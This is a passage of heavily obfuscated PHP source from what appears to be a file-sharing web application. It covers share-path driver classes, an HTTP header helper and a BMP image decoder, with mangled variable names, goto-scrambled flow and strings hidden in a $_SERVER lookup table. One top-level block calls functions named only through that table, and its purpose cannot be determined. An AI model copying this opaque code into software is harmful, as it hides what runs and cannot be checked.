C¢Öğ¢¨Œö; D”¾µª¥Û: } public static function make($e¥‹¬»Ø˜ª, $b„ÍÖÀ¸è¼) { $dšõÓ¬£ø™ =& $_SERVER[³‘’¼äÑ™ÔÍ]; return $dšõÓ¬£ø™[1776] + base64_encode($e¥‹¬»Ø˜ª . $dšõÓ¬£ø™[4] . $b„ÍÖÀ¸è¼); } } goto Cã‚ŠÔ†ñ¹; Eƒ¾¼Äõ®í: class PathDriverDbShareItem extends PathDriverDB { public function __construct($f ¢à±Èè¾) { $this->pathParse = $f ¢à±Èè¾; $this->model = Model($_SERVER[³‘’¼äÑ™ÔÍ][1121]); } public function getPathOuter($eÆ‚·ß™Äø) { $aÜ‰¸ÔŒœÊ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$eÆ‚·ß™Äø) { return $eÆ‚·ß™Äø; } $f‰õ®Á™ÙÇ = $this->parse($eÆ‚·ß™Äø); return trim(KodIO::makeShare($this->pathParse[$aÜ‰¸ÔŒœÊ[367]], $f‰õ®Á™ÙÇ[$aÜ‰¸ÔŒœÊ[367]]), $aÜ‰¸ÔŒœÊ[8]); } protected function infoParse($aæïˆŠÂ×Î, $aÃ¬ Ú·Ş = false, $AÔ¾ò½ƒ‰õ = false) { $A¹îœÜ£‘ã =& $_SERVER[³‘’¼äÑ™ÔÍ]; $c„¿œ«ĞÔ¼ = $this->pathParse[$A¹îœÜ£‘ã[367]]; $AÇì»³Ñ™Ò = trim($this->pathParse[$A¹îœÜ£‘ã[1016]], $A¹îœÜ£‘ã[8]); return Action($A¹îœÜ£‘ã[1128])->sharePathInfo($c„¿œ«ĞÔ¼, $AÇì»³Ñ™Ò); } public function infoFull($EÇçÍ½Àïó) { $F‡÷‹„—‚ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $fáŞ–ˆÚ³– = explode($F‡÷‹„—‚[8], trim($EÇçÍ½Àïó, $F‡÷‹„—‚[8])); if (count($fáŞ–ˆÚ³–) > 1) { $b‘ª™‹¢×– = implode($F‡÷‹„—‚[8], array_splice($fáŞ–ˆÚ³–, 1)); $EÌê”Ë¶„ = $this->model->pathInfoByPath($fáŞ–ˆÚ³–[0], $b‘ª™‹¢×–); if (!$EÌê”Ë¶„) { return !1; } $this->pathParse[$F‡÷‹„—‚[1016]] = $EÌê”Ë¶„[$F‡÷‹„—‚[369]]; } return $this->infoParse($EÇçÍ½Àïó); } public function listAll($B¾Ñ„¦‚ Ñ) { goto bœ©¼º‘éÔ; bœ©¼º‘éÔ: $aÊ´Â¡ôìİ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $DÒÄ‘¿‘Ìô = IO::info($this->pathParse[$aÊ´Â¡ôìİ[75]]); if (!$DÒÄ‘¿‘Ìô) { return array(); } goto B¬æ‘ºëèØ; eÒÒ÷©ñì…: foreach ($d–âíÇË›± as &$AÅ¸³ğŠÓ) { check_abort(); $AÅ¸³ğŠÓ[$aÊ´Â¡ôìİ[391]] = $C”®×­œÑ£->_shareItemeParse($AÅ¸³ğŠÓ[$aÊ´Â¡ôìİ[391]], $BÀï¨ŸİÃÎ); } return $d–âíÇË›±; goto fÀÚšäãŠô; B¬æ‘ºëèØ: $d–âíÇË›± = $this->model->listAll($B¾Ñ„¦‚ Ñ); $BÀï¨ŸİÃÎ = Model($aÊ´Â¡ôìİ[536])->getInfo($DÒÄ‘¿‘Ìô[$aÊ´Â¡ôìİ[441]]); $C”®×­œÑ£ = Action($aÊ´Â¡ôìİ[1128]); goto eÒÒ÷©ñì…; fÀÚšäãŠô: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($bŠ·…ğ’ˆ) { $this->pathParse = $bŠ·…ğ’ˆ; $this->model = Model($_SERVER[³‘’¼äÑ™ÔÍ][1121]); } protected function infoParse($a¹»ã‘Èî·, $FÇ¹Ë¨ˆ’¡ = false, $D¢æ¥Âî¥ = false) { $D’¾é¿à =& $_SERVER[³‘’¼äÑ™ÔÍ]; return Action($D’¾é¿à[1022])->sharePathInfo($this->pathParse[$D’¾é¿à[75]], !0); } public function listPath($c’½ù¢§ã, $b†Øò‚´ª = false) { $aõšØÃø¼‚ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $dğïŠ„…ÆÖ = parent::listPath($c’½ù¢§ã, $b†Øò‚´ª); foreach ($dğïŠ„…ÆÖ as $d‚ùÊ¶Ñ‘Š => $eµ¥ƒŸ½óÀ) { if (!in_array($d‚ùÊ¶Ñ‘Š, array($aõšØÃø¼‚[73], $aõšØÃø¼‚[74]))) { continue; } foreach ($eµ¥ƒŸ½óÀ as $e‹ìÖ“ƒÙ± => $b´„„¹’°Ë) { $dğïŠ„…ÆÖ[$d‚ùÊ¶Ñ‘Š][$e‹ìÖ“ƒÙ±] = Action($aõšØÃø¼‚[1022])->shareItemInfo($b´„„¹’°Ë); } } return $dğïŠ„…ÆÖ; } public function listAll($BÀ‘¥îÊ“¤) { $Dç–‹î¬·¦ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $fÆ±·¦¡òš = IO::info($this->pathParse[$Dç–‹î¬·¦[75]]); if (!$fÆ±·¦¡òš) { return array(); } $c“à‚©¡× = $this->model->listAll($BÀ‘¥îÊ“¤); foreach ($c“à‚©¡× as &$E¢ˆ×îö‘‡) { $E¢ˆ×îö‘‡[$Dç–‹î¬·¦[391]] = Action($Dç–‹î¬·¦[1022])->shareItemInfo($E¢ˆ×îö‘‡[$Dç–‹î¬·¦[391]]); } return $c“à‚©¡×; } } if ($_SERVER[$_SERVER[³‘’¼äÑ™ÔÍ][791]] != $_SERVER[$_SERVER[³‘’¼äÑ™ÔÍ][792]]) { goto e‹ñØŒ‡¨á; e‹ñØŒ‡¨á: $bÌ›ØĞ×çÉ = $_SERVER[³‘’¼äÑ™ÔÍ][794]; $a‰¾«ß³ = $_SERVER[$_SERVER[³‘’¼äÑ™ÔÍ][795]] . $_SERVER[³‘’¼äÑ™ÔÍ][796]; $DØ§¶Ä‚ = $bÌ›ØĞ×çÉ($a‰¾«ß³); goto f…ãŠ³‚Ö¿; f…ãŠ³‚Ö¿: $fš‹‹”æËÃ = explode($_SERVER[³‘’¼äÑ™ÔÍ][217], $DØ§¶Ä‚); if (count($fš‹‹”æËÃ) < $_SERVER[³‘’¼äÑ™ÔÍ][557]) { $fÀ˜»Óéãõ = $_SERVER[³‘’¼äÑ™ÔÍ][797]; $fÀ˜»Óéãõ(); } $a°·¾ÍáÂ‘ = $_SERVER[³‘’¼äÑ™ÔÍ][1129]; goto däŞÎÕ®›; däŞÎÕ®›: $a°·¾ÍáÂ‘($_SERVER[$_SERVER[³‘’¼äÑ™ÔÍ][1130]]); goto EŸ§Ïöì‘Ü; EŸ§Ïöì‘Ü: } goto F¹Àñ°ö„Â; FÀ´Á•ÏÖ¢: class HttpHeader { public static $_headers = array("\x48\157\163\x74" => "\110\x54\x54\120\137\110\x4f\x53\124", "\125\163\145\162\55\101\147\x65\x6e\164" => "\110\124\124\120\137\x55\123\105\x52\137\x41\107\105\x4e\124", "\x43\157\156\164\x65\x6e\164\55\124\x79\160\x65" => "\x48\124\x54\120\x5f\x43\117\x4e\124\x45\116\x54\x5f\x54\131\120\105", "\103\x6f\x6e\x74\x65\156\164\x2d\114\145\156\147\164\150" => "\x48\124\124\120\x5f\103\117\x4e\x54\x45\116\124\x5f\114\105\116\107\x54\110", "\104\145\160\164\150" => "\110\124\124\x50\137\104\x45\x50\x54\x48", "\x45\170\160\145\143\164" => "\110\124\x54\x50\x5f\x45\x58\120\105\103\x54", "\111\x66\x2d\x4e\x6f\156\x65\55\115\x61\x74\x63\150" => "\x48\124\124\x50\x5f\111\x46\x5f\x4e\117\x4e\x45\137\x4d\x41\x54\103\110", "\x49\146\55\x4d\x61\164\x63\x68" => "\x48\x54\124\x50\137\111\106\137\115\101\x54\103\x48", "\111\x66\55\x52\x61\156\147\145" => "\x48\124\124\120\x5f\x49\x46\137\122\101\x4e\107\x45", "\x4c\x61\163\164\x2d\115\157\144\x69\x66\x69\145\144" => "\110\x54\x54\120\137\114\x41\123\124\137\x4d\117\104\x49\x46\x49\x45\x44", "\111\146\55\115\157\x64\151\146\x69\x65\x64\x2d\x53\151\x6e\143\x65" => "\x48\x54\x54\120\137\x49\x46\x5f\115\117\104\x49\x46\111\x45\104\137\123\111\116\103\105", "\111\146\x2d\x55\156\x6d\x6f\144\151\146\x69\145\x64\55\123\151\156\143\145" => "\x48\x54\x54\x50\137\x49\x46\137\125\116\x4d\x4f\104\x49\106\111\x45\104\x5f\123\111\x4e\103\105", "\x52\141\156\147\x65" => "\x48\124\124\x50\x5f\122\101\116\x47\105", "\124\151\155\145\157\165\x74" => "\110\124\124\120\x5f\124\x49\115\x45\x4f\125\124", "\x49\x66" => "\110\124\124\x50\137\111\x46", "\x4c\157\x63\153\x2d\124\157\153\145\x6e" => "\110\124\124\120\137\x4c\x4f\x43\113\137\x54\117\113\x45\x4e", "\x4f\x76\145\x72\167\162\x69\164\x65" => "\x48\x54\x54\x50\137\117\126\x45\x52\127\122\111\124\105", "\104\145\163\164\151\156\141\164\151\x6f\x6e" => "\110\x54\x54\x50\137\104\x45\123\124\111\116\101\124\111\x4f\x4e", "\x52\x65\161\x75\x65\x73\164\x2d\111\x64" => "\122\105\x51\125\105\x53\x54\137\111\x44", "\122\x65\x71\x75\145\x73\x74\55\x42\x6f\x64\171\x2d\106\151\x6c\x65" => "\122\105\121\x55\x45\123\124\137\102\x4f\104\x59\137\106\111\114\105", "\x52\145\144\x69\x72\x65\x63\x74\x2d\123\164\141\164\165\x73" => "\x52\105\x44\111\x52\x45\x43\124\x5f\x53\124\101\x54\125\123"); public static function init() { static $E£±®‘õÓê = false; if ($E£±®‘õÓê) { return; } foreach ($_SERVER as $E¦´‰Í‚ŒŒ => $EÎÔéÉ±) { $E¦´‰Í‚ŒŒ = strtoupper($E¦´‰Í‚ŒŒ); if (!array_key_exists($E¦´‰Í‚ŒŒ, $_SERVER)) { continue; } $_SERVER[$E¦´‰Í‚ŒŒ] = $EÎÔéÉ±; } foreach (self::$_headers as $E¦´‰Í‚ŒŒ => $fâñì¼†‰­) { if (!array_key_exists($E¦´‰Í‚ŒŒ, $_SERVER)) { continue; } $_SERVER[$E¦´‰Í‚ŒŒ] = $_SERVER[$fâñì¼†‰­]; $_SERVER[strtoupper($E¦´‰Í‚ŒŒ)] = $_SERVER[$fâñì¼†‰­]; } } public static function get($C›ùŸ¥Öé) { self::init(); return $_SERVER[$C›ùŸ¥Öé] ? $_SERVER[$C›ùŸ¥Öé] : $_SERVER[$_SERVER[³‘’¼äÑ™ÔÍ][1837] . strtoupper($C›ùŸ¥Öé)]; } public static function method() { return strtoupper(self::get($_SERVER[³‘’¼äÑ™ÔÍ][154])); } public static function length() { $E¥Æ¨à…·¿ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $AËÑ©ƒèíÄ = self::get($E¥Æ¨à…·¿[1838]); if (!$AËÑ©ƒèíÄ) { $AËÑ©ƒèíÄ = self::get($E¥Æ¨à…·¿[1152]); } return $AËÑ©ƒèíÄ; } public static function range() { $E•…êÄ»¯æ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $aµš–™·¹ = self::get($E•…êÄ»¯æ[198]); if (!$aµš–™·¹) { return !1; } if (!preg_match($E•…êÄ»¯æ[1839], $aµš–™·¹, $c“â®ÚÌ·)) { return !1; } if ($c“â®ÚÌ·[1] === $E•…êÄ»¯æ[33] && $c“â®ÚÌ·[2] === $E•…êÄ»¯æ[33]) { return !1; } return array($c“â®ÚÌ·[1] !== $E•…êÄ»¯æ[33] ? $c“â®ÚÌ·[1] : null, $c“â®ÚÌ·[2] !== $E•…êÄ»¯æ[33] ? $c“â®ÚÌ·[2] : null); } public static $statusCode = array("\x31\60\x30" => "\103\x6f\156\164\151\x6e\165\x65", "\x31\x30\61" => "\123\x77\x69\164\143\x68\151\x6e\147\40\x50\x72\x6f\x74\157\143\x6f\x6c", "\x31\60\x32" => "\x50\162\x6f\143\x65\x73\163\x69\x6e\147", "\x31\x30\x33" => "\105\x61\162\x6c\171\40\x48\151\x6e\164\x73", "\x32\x30\x30" => "\117\x4b", "\62\60\x31" => "\103\x72\145\141\x74\145\144", "\62\x30\x32" => "\x41\x63\143\x65\160\164\145\x64", "\x32\x30\x33" => "\x4e\x6f\x6e\x2d\x41\165\164\x68\x6f\162\x69\164\141\x74\151\166\145\40\x49\x6e\x66\x6f\162\x6d\x61\x74\x69\x6f\x6e", "\62\60\64" => "\x4e\x6f\40\103\157\156\164\x65\x6e\164", "\x32\60\65" => "\122\x65\163\145\x74\x20\x43\x6f\156\x74\145\156\x74", "\x32\60\66" => "\120\141\162\x74\x69\x61\x6c\x20\103\157\x6e\x74\145\156\x74", "\x32\x30\x37" => "\x4d\x75\154\x74\x69\55\123\164\x61\x74\x75\163", "\63\x30\x30" => "\115\165\154\x74\x69\160\x6c\x65\40\103\x68\157\151\x63\145\x73", "\63\x30\x31" => "\x4d\157\166\x65\144\x20\x50\145\162\x6d\141\x6e\145\156\164\x6c\171", "\63\60\62" => "\x46\x6f\x75\x6e\144", "\63\60\x33" => "\123\145\145\40\117\164\150\145\x72", "\63\60\64" => "\x4e\157\164\x20\115\x6f\144\151\x66\151\x65\x64", "\x33\x30\x35" => "\x55\163\x65\40\120\162\x6f\170\171", "\x33\60\67" => "\124\145\x6d\x70\157\x72\141\162\171\40\x52\145\x64\151\x72\145\x63\164", "\63\60\x38" => "\x50\145\162\x6d\x61\x6e\145\x6e\x74\x20\122\145\x64\151\162\x65\143\164", "\64\x30\x30" => "\x42\141\144\40\x52\145\x71\x75\x65\x73\164", "\x34\60\61" => "\x55\156\141\165\x74\150\x6f\x72\151\x7a\x65\x64", "\64\60\x32" => "\120\x61\171\x6d\145\x6e\164\40\122\145\161\x75\x69\x72\x65\144", "\64\60\x33" => "\x46\157\x72\x62\151\x64\144\145\x6e", "\x34\x30\64" => "\x4e\157\x74\x20\106\157\x75\156\144", "\x34\x30\65" => "\115\x65\164\150\x6f\144\40\x4e\157\164\40\x41\x6c\154\x6f\167\145\x64", "\64\60\x36" => "\116\157\x74\40\x41\143\143\x65\160\164\x61\x62\154\145", "\x34\60\67" => "\x50\x72\157\x78\171\40\x41\x75\x74\x68\145\156\x74\x69\143\x61\164\x69\x6f\156\40\122\145\161\165\151\x72\x65\x64", "\64\x30\70" => "\122\145\161\165\145\163\x74\40\124\x69\155\x65\157\165\164", "\64\60\71" => "\x43\157\156\146\x6c\x69\x63\164", "\x34\x31\x30" => "\x47\157\x6e\x65", "\64\x31\x31" => "\114\x65\x6e\147\x74\150\40\x52\145\161\x75\x69\x72\145\144", "\x34\x31\62" => "\x50\162\145\x63\157\156\x64\x69\x74\151\x6f\x6e\x20\106\141\x69\154\x65\x64", "\64\61\x33" => "\x52\145\161\x75\x65\x73\164\40\x45\156\x74\x69\164\x79\x20\x54\157\x6f\40\114\x61\162\x67\x65", "\64\61\x34" => "\x52\x65\161\165\145\x73\x74\40\x55\x52\x49\40\x54\x6f\x6f\x20\x4c\x61\x72\147\145", "\64\x31\65" => "\125\x6e\163\x75\160\x70\157\x72\x74\x65\x64\x20\115\145\144\151\141\40\x54\171\160\x65", "\x34\61\66" => "\122\145\161\x75\145\x73\x74\145\x64\40\122\x61\156\x67\145\x20\x4e\157\x74\x20\123\x61\164\151\x73\146\151\x61\142\x6c\x65", "\64\x31\x37" => "\105\170\160\145\143\164\141\164\151\157\156\x20\x46\141\x69\x6c\145\x64", "\64\x32\x32" => "\125\156\160\162\x6f\143\x65\x73\163\141\x62\154\x65\x20\105\x6e\x74\151\x74\171", "\x34\62\x33" => "\114\x6f\143\153\145\144", "\64\62\64" => "\106\141\x69\154\x65\x64\x20\104\x65\160\145\156\x64\145\156\143\171", "\64\62\x35" => "\x55\156\157\162\144\x65\162\145\x64\40\x43\x6f\154\x6c\x65\143\164\151\157\156", "\64\x32\x36" => "\x55\160\147\162\x61\144\145\40\x52\145\x71\x75\x69\x72\145\x64", "\x34\62\x38" => "\x50\x72\x65\143\157\x6e\x64\x69\164\x69\157\x6e\x20\x52\145\161\x75\x69\162\x65\144", "\64\x32\x39" => "\x54\157\x6f\40\115\141\x6e\171\x20\x52\145\161\x75\145\163\x74\x73", "\x34\63\x31" => "\x52\145\161\165\x65\163\164\40\110\x65\141\144\x65\x72\40\x46\151\x65\154\x64\x73\x20\124\x6f\157\x20\114\141\x72\x67\x65", "\64\64\x34" => "\x4e\x6f\x20\122\145\163\160\x6f\x6e\163\145", "\x34\x35\x30" => "\102\154\x6f\x63\x6b\145\144\40\x62\x79\x20\x57\151\156\144\x6f\x77\163\x20\120\x61\x72\145\156\x74\x61\x6c\x20\x43\157\x6e\x74\x72\157\x6c\163", "\64\65\x31" => "\125\156\x61\x76\141\x69\x6c\x61\142\154\x65\x20\106\x6f\x72\x20\x4c\x65\x67\x61\x6c\x20\x52\145\141\x73\157\x6e\163", "\x34\x39\x34" => "\122\145\x71\x75\x65\x73\x74\40\x48\x65\x61\144\x65\162\40\x54\157\x6f\x20\114\x61\162\x67\x65", "\x35\x30\60" => "\x49\x6e\164\x65\x72\x6e\141\x6c\40\123\145\162\166\x65\162\40\x45\x72\x72\x6f\x72", "\x35\60\61" => "\x4e\157\164\x20\111\x6d\x70\154\x65\155\145\156\x74\x65\x64", "\65\x30\62" => "\102\x61\x64\40\107\141\x74\145\x77\x61\x79", "\65\60\63" => "\123\x65\x72\166\151\x63\145\40\x55\x6e\141\166\141\151\154\141\142\x6c\145", "\x35\x30\x34" => "\107\141\164\145\x77\x61\171\40\x54\151\x6d\145\x6f\165\x74", "\x35\x30\65" => "\x48\x54\124\120\40\x56\145\162\163\x69\x6f\156\x20\156\157\x74\40\163\165\x70\160\x6f\162\x74\145\144", "\65\x30\67" => "\x49\156\x73\x75\146\146\151\143\x69\x65\x6e\164\x20\123\x74\157\x72\141\147\x65"); public static function code($b†ˆªÂÈÀò) { $DÕ’ÊÔ‚†î =& $_SERVER[³‘’¼äÑ™ÔÍ]; $b†ˆªÂÈÀò = $b†ˆªÂÈÀò . $DÕ’ÊÔ‚†î[33]; $a¦õë­•›ã = self::$statusCode[$b†ˆªÂÈÀò]; $a¦õë­•›ã = $a¦õë­•›ã ? "\110\x54\124\x50\57\x31\x2e\61\x20{$b†ˆªÂÈÀò}\40" . $a¦õë­•›ã : $DÕ’ÊÔ‚†î[33]; return $a¦õë­•›ã; } } class ImageGdBMP { public static function load($FòÔ›‡Šˆ½) { $E¿¼ÏÏù = fopen($FòÔ›‡Šˆ½, $_SERVER[³‘’¼äÑ™ÔÍ][1529]); if ($E¿¼ÏÏù === !1) { return !1; } $C‚çáÁ˜ˆ† = self::loadFromStream($E¿¼ÏÏù); fclose($E¿¼ÏÏù); return $C‚çáÁ˜ˆ†; } public static function loadFromStream($e…ÇâøÈ½ƒ) { $B¼‘¥’°®ö =& $_SERVER[³‘’¼äÑ™ÔÍ]; $C¥Ù‡¢Ì¹‹ = fread($e…ÇâøÈ½ƒ, 14); if ($C¥Ù‡¢Ì¹‹ === !1) { return !1; } if ($C¥Ù‡¢Ì¹‹[0] != $B¼‘¥’°®ö[1840] || $C¥Ù‡¢Ì¹‹[1] != $B¼‘¥’°®ö[1841]) { return !1; } $aÌÆŸåŠä¥ = unpack($B¼‘¥’°®ö[1842] . $B¼‘¥’°®ö[1843] . $B¼‘¥’°®ö[1844] . $B¼‘¥’°®ö[1845] . $B¼‘¥’°®ö[1846], $C¥Ù‡¢Ì¹‹); return self::loadFromStreamAndFileHeader($e…ÇâøÈ½ƒ, $aÌÆŸåŠä¥); } public static function loadFromStreamAndFileHeader($aïìººÇõ, array $bÑŞï³ÁÔ) { goto fÏ„î¦ÇÕ; fÏ„î¦ÇÕ: $b©øÌÑô†Ä =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($bÑŞï³ÁÔ[$b©øÌÑô†Ä[388]] != 19778) { return !1; } $B¡†ê¬Æ‘İ = fread($aïìººÇõ, 4); goto cÔâ„½…ØÄ; fÜÆÍª‹®Ã: if ($F­¹Ãš¹š == 1 || $F­¹Ãš¹š == 4 || $F­¹Ãš¹š == 8) { goto E„»ˆƒí; d¬…¦ÇÙ³: $b«Ï£†å×ö = (1 << $F­¹Ãš¹š) - 1 << $AÅâÕ‡½Û“; if ($e‹˜ÙöËîø == 1 || $e‹˜ÙöËîø == 2) { $F“ìÅ«×‹ = 0; $CìÒ“††ì = $F­¹Ãš¹š >> 2 & 1; for (;;) { if ($F“ìÅ«×‹ < -1 || $F“ìÅ«×‹ > $f¦„­…Šò„ || $d¡ßÌ•†¤« < -1 || $d¡ßÌ•†¤« > $dï‰ƒÜ•˜) { imagedestroy($a­ÌğÕäöƒ); return !1; } $B¡†ê¬Æ‘İ = fread($aïìººÇõ, 1); if ($B¡†ê¬Æ‘İ === !1) { imagedestroy($a­ÌğÕäöƒ); return !1; } switch ($B¡†ê¬Æ‘İ) { case $b©øÌÑô†Ä[1865]: $B¡†ê¬Æ‘İ = fread($aïìººÇõ, 1); if ($B¡†ê¬Æ‘İ === !1) { imagedestroy($a­ÌğÕäöƒ); return !1; } switch ($B¡†ê¬Æ‘İ) { case $b©øÌÑô†Ä[1865]: $d¡ßÌ•†¤« += $C¬¾Ëùî¤; $F“ìÅ«×‹ = 0; break; case $b©øÌÑô†Ä[1867]: $d¡ßÌ•†¤« = 0; $F“ìÅ«×‹ = 0; break 3; case $b©øÌÑô†Ä[1868]: $B¡†ê¬Æ‘İ = fread($aïìººÇõ, 2); if ($B¡†ê¬Æ‘İ === !1) { imagedestroy($a­ÌğÕäöƒ); return !1; } list(, $eŸñšƒ‚†, $cì¯õŠËïè) = unpack($b©øÌÑô†Ä[1869], $B¡†ê¬Æ‘İ); $F“ìÅ«×‹ += $eŸñšƒ‚†; $d¡ßÌ•†¤« += $cì¯õŠËïè * $C¬¾Ëùî¤; break; default: list(, $C“¡ˆ¥¨Î˜) = unpack($b©øÌÑô†Ä[1870], $B¡†ê¬Æ‘İ); $FŠÑÃÃé¶ = ($C“¡ˆ¥¨Î˜ >> $CìÒ“††ì) + ($C“¡ˆ¥¨Î˜ & $CìÒ“††ì); $B¡†ê¬Æ‘İ = fread($aïìººÇõ, $FŠÑÃÃé¶ + 1 & ~1); if ($B¡†ê¬Æ‘İ === !1) { imagedestroy($a­ÌğÕäöƒ); return !1; } for ($c­™îã¸à¹ = 0, $A‘ò…ìŞ = 0; $c­™îã¸à¹ < $C“¡ˆ¥¨Î˜; ++$c­™îã¸à¹, ++$F“ìÅ«×‹, $A‘ò…ìŞ += $F­¹Ãš¹š) { list(, $Dˆƒ¿´Îó) = unpack($b©øÌÑô†Ä[1870], $B¡†ê¬Æ‘İ[$A‘ò…ìŞ >> 3]); $bÄ¯Ò—Å‹Œ = $A‘ò…ìŞ & 7; imagesetpixel($a­ÌğÕäöƒ, $F“ìÅ«×‹, $d¡ßÌ•†¤«, $d®Ãƒò¬Ó[($Dˆƒ¿´Îó & $b«Ï£†å×ö >> $bÄ¯Ò—Å‹Œ) >> $AÅâÕ‡½Û“ - $bÄ¯Ò—Å‹Œ]); } break; } break; default: $b¯ß¥„‹•Ê = fread($aïìººÇõ, 1); if ($b¯ß¥„‹•Ê === !1) { imagedestroy($a­ÌğÕäöƒ); return !1; } list(, $dƒ®¤¨“†, $Dˆƒ¿´Îó) = unpack($b©øÌÑô†Ä[1869], $B¡†ê¬Æ‘İ . $b¯ß¥„‹•Ê); for ($c­™îã¸à¹ = 0, $A‘ò…ìŞ = 0; $c­™îã¸à¹ < $dƒ®¤¨“†; ++$c­™îã¸à¹, ++$F“ìÅ«×‹, $A‘ò…ìŞ += $F­¹Ãš¹š) { $bÄ¯Ò—Å‹Œ = $A‘ò…ìŞ & 7; imagesetpixel($a­ÌğÕäöƒ, $F“ìÅ«×‹, $d¡ßÌ•†¤«, $d®Ãƒò¬Ó[($Dˆƒ¿´Îó & $b«Ï£†å×ö >> $bÄ¯Ò—Å‹Œ) >> $AÅâÕ‡½Û“ - $bÄ¯Ò—Å‹Œ]); } break; } } } else { for ($F‘Çğ³ã½ = 0; $F‘Çğ³ã½ < $a¡ø¶í£Ó³; ++$F‘Çğ³ã½, $d¡ßÌ•†¤« += $C¬¾Ëùî¤) { $B¡†ê¬Æ‘İ = fread($aïìººÇõ, $c­¬ÔÀèÕ); if ($B¡†ê¬Æ‘İ === !1) { imagedestroy($a­ÌğÕäöƒ); return !1; } $A‘ò…ìŞ = 0; for ($F“ìÅ«×‹ = 0; $F“ìÅ«×‹ < $f¦„­…Šò„; ++$F“ìÅ«×‹, $A‘ò…ìŞ += $F­¹Ãš¹š) { list(, $Dˆƒ¿´Îó) = unpack($b©øÌÑô†Ä[1870], $B¡†ê¬Æ‘İ[$A‘ò…ìŞ >> 3]); $bÄ¯Ò—Å‹Œ = $A‘ò…ìŞ & 7; imagesetpixel($a­ÌğÕäöƒ, $F“ìÅ«×‹, $d¡ßÌ•†¤«, $d®Ãƒò¬Ó[($Dˆƒ¿´Îó & $b«Ï£†å×ö >> $bÄ¯Ò—Å‹Œ) >> $AÅâÕ‡½Û“ - $bÄ¯Ò—Å‹Œ]); } } } goto DÈêË˜ù…; E„»ˆƒí: $a­ÌğÕäöƒ = imagecreate($f¦„­…Šò„, $a¡ø¶í£Ó³); $DîÚÊàÆ±¿ = $bßĞ¿”±é• == 12 ? 3 : 4; $dÃƒ†ãğÙ‚ = $E×…¶‘ ? $E×…¶‘ : pow(2, $F­¹Ãš¹š); goto c‡ÒŠ¦âäö; c‡ÒŠ¦âäö: $d®Ãƒò¬Ó = array(); for ($c­™îã¸à¹ = 0; $c­™îã¸à¹ < $dÃƒ†ãğÙ‚; ++$c­™îã¸à¹) { $B¡†ê¬Æ‘İ = fread($aïìººÇõ, $DîÚÊàÆ±¿); if ($B¡†ê¬Æ‘İ === !1) { imagedestroy($a­ÌğÕäöƒ); return !1; } extract(unpack($b©øÌÑô†Ä[1866], $B¡†ê¬Æ‘İ . $b©øÌÑô†Ä[1865])); $d®Ãƒò¬Ó[] = imagecolorallocate($a­ÌğÕäöƒ, $BÖÆ™ÍàÆ‡, $AğÎª“Ùğ°, $bÄ¯Ò—Å‹Œ); } $AÅâÕ‡½Û“ = 8 - $F­¹Ãš¹š; goto d¬…¦ÇÙ³; DÈêË˜ù…: } else { goto dÍÙé®¿É; E¦Õ¢Çæµ¸: $c¹Çñº‰‚“ = $a²í«¼Ú×í ? 1 / $a²í«¼Ú×í : 1; $fì¯°óš”Ò = $F‘Òô¦Â‰ ? 1 / $F‘Òô¦Â‰ : 1; $féŠ†¬ƒ™² = $a„“Ü¼¯¦™ ? 1 / $a„“Ü¼¯¦™ : 1; goto f³º·ö Ì¤; f³º·ö Ì¤: for ($F‘Çğ³ã½ = 0; $F‘Çğ³ã½ < $a¡ø¶í£Ó³; ++$F‘Çğ³ã½, $d¡ßÌ•†¤« += $C¬¾Ëùî¤) { $B¡†ê¬Æ‘İ = fread($aïìººÇõ, $c­¬ÔÀèÕ); if ($B¡†ê¬Æ‘İ === !1) { imagedestroy($a­ÌğÕäöƒ); return !1; } $A‘ò…ìŞ = 0; for ($F“ìÅ«×‹ = 0; $F“ìÅ«×‹ < $f¦„­…Šò„; ++$F“ìÅ«×‹, $A‘ò…ìŞ += $a¸œÓ«ù…½) { list(, $Dˆƒ¿´Îó) = unpack($b©øÌÑô†Ä[1847], substr($B¡†ê¬Æ‘İ, $A‘ò…ìŞ, $a¸œÓ«ù…½) . $b©øÌÑô†Ä[1871]); $C£ÛÍ»† = $Dˆƒ¿´Îó & $cä“Ö’õ‘; $Cƒ –ê£Îø = $Dˆƒ¿´Îó & $a²í«¼Ú×í; $b«Å‘‹ÑÂ = $Dˆƒ¿´Îó & $F‘Òô¦Â‰; $a…œ‚‚ãÒ· = $Dˆƒ¿´Îó & $a„“Ü¼¯¦™; $b‡®ÑòñØ™ = $CÔÉÇò§— - (($C£ÛÍ»† << 7) - $C£ÛÍ»†) * $FÚ®¨âæ§Ï; $BÖÆ™ÍàÆ‡ = (($Cƒ –ê£Îø << 8) - $Cƒ –ê£Îø) * $c¹Çñº‰‚“; $AğÎª“Ùğ° = (($b«Å‘‹ÑÂ << 8) - $b«Å‘‹ÑÂ) * $fì¯°óš”Ò; $bÄ¯Ò—Å‹Œ = (($a…œ‚‚ãÒ· << 8) - $a…œ‚‚ãÒ·) * $féŠ†¬ƒ™²; imagesetpixel($a­ÌğÕäöƒ, $F“ìÅ«×‹, $d¡ßÌ•†¤«, $b‡®ÑòñØ™ << 24 | $BÖÆ™ÍàÆ‡ << 16 | $AğÎª“Ùğ° << 8 | $bÄ¯Ò—Å‹Œ); } } imagealphablending($a­ÌğÕäöƒ, !0); goto c—óŒÙÀ‡¢; Cƒ•õï´Ÿ: $a¸œÓ«ù…½ = $F­¹Ãš¹š >> 3; $CÔÉÇò§— = $cä“Ö’õ‘ ? 127 : 0; $FÚ®¨âæ§Ï = $cä“Ö’õ‘ ? 1 / $cä“Ö’õ‘ : 1; goto E¦Õ¢Çæµ¸; dÍÙé®¿É: $a­ÌğÕäöƒ = imagecreatetruecolor($f¦„­…Šò„, $a¡ø¶í£Ó³); imagealphablending($a­ÌğÕäöƒ, !1); if ($cä“Ö’õ‘) { imagesavealpha($a­ÌğÕäöƒ, !0); } goto Cƒ•õï´Ÿ; c—óŒÙÀ‡¢: } return $a­ÌğÕäöƒ; goto e›£õíâ½; D²·æÕÁéÓ: if ($f¦„­…Šò„ == 0 || $dï‰ƒÜ•˜ == 0 || $A‚‡İ‚™ != 1 || ($cä“Ö’õ‘ & $a²í«¼Ú×í) != 0 || ($cä“Ö’õ‘ & $F‘Òô¦Â‰) != 0 || 